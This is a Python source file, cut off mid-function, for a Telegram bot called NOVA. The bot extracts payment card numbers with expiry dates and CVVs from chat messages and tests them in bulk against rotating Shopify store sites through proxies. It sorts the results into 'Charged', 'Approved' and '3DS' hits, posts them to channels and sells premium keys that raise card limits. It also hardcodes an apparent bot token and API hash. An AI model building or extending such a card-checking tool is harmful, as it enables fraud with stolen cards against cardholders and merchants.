# =============================================================================
# NOVA Bot — Complete Single-File Source (v3.1)
# API: https://shopify-api-wkhm.onrender.com/check
# Fixes: no URL-encoding, proxy validation, longer timeouts
# Premium emoji styling on /fake
# =============================================================================

import os
import re
import json
import time
import random
import string
import logging
import asyncio
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List

import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# ====================== LOGGING ======================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt); log.addHandler(_ch)
try:
    _fh = logging.FileHandler('nova_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt); log.addHandler(_fh)
except Exception:
    pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1004381920430

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"
SEP          = "━━━━━━━━━━━━━━━━━"
PE           = "💎"

SHOPIFY_API_URL  = "https://shopify-api-wkhm.onrender.com/check"
RAZORPAY_API_URL = "https://web-production-43fc5.up.railway.app/razorpay/check"

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

PREMIUM_USERS_FILE = "premium_users.json"
USER_PROXIES_FILE  = "user_proxies.json"
KEYS_FILE          = "keys.json"
SITES_FILE         = "sites.txt"
RANK_FILE          = "rank.json"
SETTINGS_FILE      = "settings.json"


# ====================== PREMIUM EMOJI ======================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5040042498634810056","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🏆":"6089185885289454318","👑":"5039727497143387500","👤":"5992129361090711368",
    "🤖":"6174896506051495705","⚙️":"5445059250382469069","🌐":"6321225560789877992",
    "ℹ️":"5334544901428229844","🏳️":"5256143829672672750","📍":"5391032818111363540",
    "📡":"5447448489149625830","🔔":"5042111805288089118","🛡":"5042328396193864923",
    "🔑":"5399885604701880145","🔒":"5445059250382469069","🔓":"5445373981290952548",
    "🔗":"5042101437237036298","⏰":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "🌍":"5447410659077661506","🔰":"5042328396193864923","📧":"5443127283898405358",
    "💀":"5042209657527993345","💯":"5042297717242463211","🚫":"5039671744172917707",
    "🎀":"5039953030171067177","🧨":"5039778134807806727","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","⏸":"5042036407137207122","▶️":"5039753786638205957",
    "⏹":"5134537521518085000","🧹":"5039751080808809534","📌":"5397782960512444700",
    "📋":"5445260044398524944","🔧":"5445059250382469069","💠":"5427168083074628963",
    "🔍":"5042302287087666158","💻":"5039579582764680065","📩":"5443127283898405358",
    "🔀":"5348386034835015762","😈":"6336664426325740768","💬":"5040036030414062506",
    "💡":"5042264341051605743",
    "🏠":"5416041192905265756","🏙️":"5447410659077661506","📞":"5443127283898405358",
    "📮":"5444889156792646660",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# ====================== MESSAGE HELPERS ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities,
                                         buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except Exception:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


# ====================== BUTTON HELPER ======================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# ====================== JSON STORAGE ======================
def _read_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def _write_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        log_system("FS", f"write {path} failed: {e}", "error")


def load_premium_users() -> dict:
    data = _read_json(PREMIUM_USERS_FILE, None)
    if data is None:
        data = {str(uid): None for uid in ADMIN_ID}
        _write_json(PREMIUM_USERS_FILE, data)
    return data


def save_premium_users(data: dict):
    _write_json(PREMIUM_USERS_FILE, data)


def is_premium(user_id: int) -> bool:
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return False
    expiry = data[uid]
    if expiry is None:
        return True
    info = expiry
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp is None:
            return True
        if datetime.now().timestamp() > float(exp):
            del data[uid]
            save_premium_users(data)
            return False
        return True
    if datetime.now().timestamp() > float(info):
        del data[uid]
        save_premium_users(data)
        return False
    return True


def add_premium(user_id: int, expiry_ts=None, cc_limit=None):
    data = load_premium_users()
    if expiry_ts is None and cc_limit is None:
        data[str(user_id)] = None
    else:
        data[str(user_id)] = {"expiry": expiry_ts, "cc_limit": cc_limit or 100000,
                              "activated_at": datetime.now().isoformat()}
    save_premium_users(data)


def remove_premium(user_id: int) -> bool:
    data = load_premium_users()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_users(data)
        return True
    return False


def get_cc_limit(user_id: int) -> int:
    if user_id in ADMIN_ID:
        return 100000
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return 0
    info = data[uid]
    if info is None:
        return 100000
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp and datetime.now().timestamp() > float(exp):
            return 0
        return int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT))
    return 100000


def load_user_proxies(user_id: int) -> list:
    data = _read_json(USER_PROXIES_FILE, {})
    return data.get(str(user_id), [])


def save_user_proxies(user_id: int, proxies: list):
    data = _read_json(USER_PROXIES_FILE, {})
    data[str(user_id)] = proxies
    _write_json(USER_PROXIES_FILE, data)


def load_sites() -> list:
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_sites(sites: list):
    try:
        with open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save sites failed: {e}", "error")


def load_keys() -> dict:
    return _read_json(KEYS_FILE, {})


def save_keys(keys: dict):
    _write_json(KEYS_FILE, keys)


def generate_key() -> str:
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


def load_rank() -> dict:
    return _read_json(RANK_FILE, {})


def save_rank(data: dict):
    _write_json(RANK_FILE, data)


def increment_charge_count(user_id: int):
    data = load_rank()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + 1
    save_rank(data)


def load_settings() -> dict:
    return _read_json(SETTINGS_FILE, {"maintenance": False, "threshold": 10.0})


def save_settings(data: dict):
    _write_json(SETTINGS_FILE, data)


def get_maintenance() -> bool:
    return bool(load_settings().get("maintenance", False))


def set_maintenance(enabled: bool):
    s = load_settings()
    s["maintenance"] = bool(enabled)
    save_settings(s)


def get_threshold() -> float:
    return float(load_settings().get("threshold", 10.0))


def set_threshold(val: float):
    s = load_settings()
    s["threshold"] = float(val)
    save_settings(s)


# ====================== UTILITIES ======================
def extract_cc(text: str) -> list:
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url: str) -> bool:
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def normalize_site_url(url: str) -> str:
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def extract_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy: str):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


_GLOBAL_HTTP = None
_GLOBAL_BIN  = None
_GLOBAL_PROXY= None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60, connect=10),
            connector=aiohttp.TCPConnector(limit=200, limit_per_host=50,
                                           ttl_dns_cache=300, use_dns_cache=True),
        )
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=50, ttl_dns_cache=300),
        )
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=25),
            connector=aiohttp.TCPConnector(limit=50, ttl_dns_cache=300),
        )
    return _GLOBAL_PROXY


# ====================== EXTRAS (inline) ======================
class SmartRotator:
    def __init__(self):
        self._sf, self._pf = {}, {}

    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude] or sites
        return random.choice(available) if available else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        available = [p for p in proxies if p not in exclude] or proxies
        return random.choice(available) if available else None

    def report_site_ok(self, s):   pass
    def report_site_fail(self, s): pass
    def report_proxy_ok(self, p):  pass
    def report_proxy_fail(self, p):pass


def get_user_sem(uid, t="msp"):
    return asyncio.Semaphore(30)


def cleanup_user_sem(uid): pass


async def get_user_http_session(uid, purpose="general"):
    return await get_http_session()


async def cleanup_user_http_session(uid, purpose="general"): pass


def is_site_error(t):
    if not t:
        return True
    tl = str(t).lower()
    keys = ["site error", "invalid site", "site not found", "error fetching",
            "failed to connect", "connection refused", "timed out", "timeout",
            "502", "503", "504", "cloudflare", "captcha", "maintenance"]
    return any(k in tl for k in keys)


def is_proxy_error(t):
    if not t:
        return False
    tl = str(t).lower()
    keys = ["proxy", "407", "tunnel", "connection reset", "socks"]
    return any(k in tl for k in keys)


def is_rz_retry_error(t):
    if not t:
        return True
    tl = str(t).lower()
    keys = ["timeout", "retry", "error", "failed", "502", "503", "504"]
    return any(k in tl for k in keys)


def is_truly_alive(r, p):
    return True


def rz_clean_response(r):
    return r


_BIN_CACHE = {}


async def get_bin_info_cached(card_number, session):
    cn = card_number[:6] if card_number else ''
    if not cn or len(cn) < 6:
        return ('-', '-', '-', '-', '-', '')
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    try:
        url = f"https://lookup.binlist.net/{cn}"
        headers = {'Accept-Version': '3'}
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                scheme = data.get('scheme', '-') or '-'
                typ = data.get('type', '-') or '-'
                brand = data.get('brand', '-') or '-'
                bank = (data.get('bank') or {}).get('name', '-') or '-'
                country = (data.get('country') or {}).get('name', '-') or '-'
                flag = (data.get('country') or {}).get('emoji', '') or ''
                result = (scheme.upper(), typ.upper(), brand.upper(), bank, country, flag)
                _BIN_CACHE[cn] = result
                return result
    except Exception:
        pass
    return ('-', '-', '-', '-', '-', '')


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n💎 <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime_sec = time.time() - BOT_START_TIME
        h, m, s = int(uptime_sec // 3600), int((uptime_sec % 3600) // 60), int(uptime_sec % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
🖥️ CPU: <code>{cpu}%</code>
🧠 RAM: <code>{mem.percent}%</code> ({mem.used // (1024**2)}MB / {mem.total // (1024**2)}MB)
💾 Disk: <code>{disk.percent}%</code>
⏱️ Uptime: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


SP_PER_USER_WORKERS  = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS  = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50


# ====================== FORCE-JOIN ======================
_JOIN_CACHE = {}


async def is_user_joined(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    if _JOIN_CACHE.get(user_id, 0) + 600 > now:
        return True
    if not GROUP_CHAT_ID:
        return True
    try:
        from telethon.tl.functions.channels import GetParticipantRequest
        for cid in [GROUP_CHAT_ID]:
            if cid:
                try:
                    await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
                except UserNotParticipantError:
                    return False
                except Exception:
                    pass
        _JOIN_CACHE[user_id] = now
        return True
    except Exception:
        return True


async def force_join_check(event) -> bool:
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    buttons = [
        [Button.url(bs("Join Channel"), CHANNEL_INVITE_LINK),
         Button.url(bs("Join Group"),   GROUP_INVITE_LINK)],
        [pbtn(bs("✅ I Joined"), data="check_joined", style="success", icon="✅")],
    ]
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
💎 <b>{bs('Join both chats to unlock')}</b>
{SEP}
💎 {bs('Channel')}: <i>NOVA Channel</i>
💎 {bs('Group')}:   <i>NOVA Chat</i>
{SEP}
💎 <b>{bs('All features restricted')}</b>""")
    await styled_reply(event, text, buttons=buttons)
    return False


async def check_maintenance(event) -> bool:
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
💎 <b>{bs('Bot under maintenance')}</b>
💎 <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
💎 {bs('This command requires premium access')}
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
        buttons=[[pbtn(bs("Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}", style="primary")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
💎 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# ====================== CLIENT ======================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


# ====================== FREE-TIER TRACKER ======================
_FREE_USAGE = {}
_FREE_LAST  = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id: int) -> int:
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id: int):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id: int) -> float:
    last = _FREE_LAST.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - elapsed, 1)


def set_free_last(user_id: int):
    _FREE_LAST[user_id] = time.time()


# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
RAZORPAY_RESULTS= {}
BOT_START_TIME  = time.time()

# ====================== VIDEO SYSTEM ======================
BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# ====================== BIN LOOKUP ======================
async def get_bin_info(card_number: str):
    return await get_bin_info_cached(card_number, await get_bin_session())


# ====================== SHOPIFY API ======================
def _proxy_str_for_api(proxy: str):
    if not proxy:
        return None
    p = parse_proxy_format(proxy)
    if not p:
        return None
    try:
        port_int = int(p['port'])
        if not (0 < port_int <= 65535):
            return None
    except (ValueError, TypeError):
        return None
    if p['username'] and p['password']:
        return f"{p['ip']}:{p['port']}:{p['username']}:{p['password']}"
    return f"{p['ip']}:{p['port']}"


def build_shopify_url(site: str, card: str, proxy: str = None) -> str:
    site = re.sub(r'^https?://', '', site).rstrip('/')
    url = f"{SHOPIFY_API_URL}?url={site}&card={card}"
    ps = _proxy_str_for_api(proxy)
    if ps:
        url += f"&proxy={ps}"
    return url


def classify_shopify(raw: dict, card: str, site: str = None, proxy=None):
    response = str(raw.get('Response', ''))
    resp_low = response.lower()
    price_raw = raw.get('Price', '-')
    try:
        price_val = float(str(price_raw).replace('$', '').replace(',', '').strip())
    except Exception:
        price_val = 0.0
    price_disp = f"${price_raw}" if price_raw not in ('-', '', 0, '0') else '-'
    gateway = raw.get('Gateway', raw.get('Gate', 'Shopify'))

    if is_site_error(response) or response.upper() in ("ERROR", "SITE ERROR"):
        return {'status': 'Dead', 'message': response or 'Site error',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy}

    charged_keys = ['charged', 'order_paid', 'order_placed', 'order_confirmed',
                    'thank you', 'payment successful', 'order_completed',
                    'order_created', 'order confirmed', 'transaction success']
    if any(k in resp_low for k in charged_keys):
        return {'status': 'Charged', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy}

    threeds_keys = ['3d', '3d secure', 'otp', 'verification required',
                    'authenticate', 'authentication required', 'challenge required',
                    'redirecting to bank', 'bank verification', 'send code',
                    'enter code', 'verify', '3ds_required', '3ds required']
    if any(k in resp_low for k in threeds_keys):
        return {'status': '3DS', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy}

    approved_keys = ['approved', 'success', 'insufficient_funds', 'insufficient funds',
                     'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
                     'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
                     'incorrect_zip', 'incorrect zip', 'cvv issue', 'ccn',
                     'cvc', 'do_not_honor', 'do not honor']
    if any(k in resp_low for k in approved_keys):
        return {'status': 'Approved', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy}

    return {'status': 'Dead', 'message': response or 'Declined',
            'card': card, 'site': site, 'gateway': gateway,
            'price': price_disp, 'price_value': price_val, 'proxy': proxy}


async def check_card_shopify(card: str, site: str, proxy: str = None, http_session=None):
    parts = card.split('|')
    if len(parts) != 4:
        return {'status': 'Dead', 'message': 'Invalid format', 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy}, None
    url = build_shopify_url(site, card, proxy)
    session = http_session or (await get_http_session())
    try:
        async with session.get(url) as resp:
            if resp.status != 200:
                return {'status': 'Dead', 'message': f"HTTP {resp.status}", 'card': card,
                        'site': site, 'gateway': 'Shopify', 'price': '-',
                        'price_value': 0.0, 'proxy': proxy}, proxy
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'status': 'Dead', 'message': 'Invalid JSON', 'card': card,
                        'site': site, 'gateway': 'Shopify', 'price': '-',
                        'price_value': 0.0, 'proxy': proxy}, proxy
        return classify_shopify(raw, card, site, proxy), proxy
    except asyncio.TimeoutError:
        return {'status': 'Dead', 'message': 'Timeout', 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy}, proxy
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'Dead', 'message': str(e)[:100], 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy}, proxy


async def check_card_with_retry(card: str, sites: list, proxies: list,
                                max_retries: int = 3, rotator=None, http_session=None):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0}, None
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0}, None

    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    for attempt in range(max_retries):
        site = rotator.pick_site(sites, exclude=tried_sites)
        if not site:
            break
        tried_sites.add(site)

        proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await check_card_shopify(card, site, proxy, http_session)
        last_proxy = used_proxy or last_proxy
        last_result = result

        msg = result.get('message', '')
        status = result.get('status', 'Dead')

        if status != 'Dead' or not (is_site_error(msg) or is_proxy_error(msg)):
            rotator.report_site_ok(site)
            if proxy:
                rotator.report_proxy_ok(proxy)
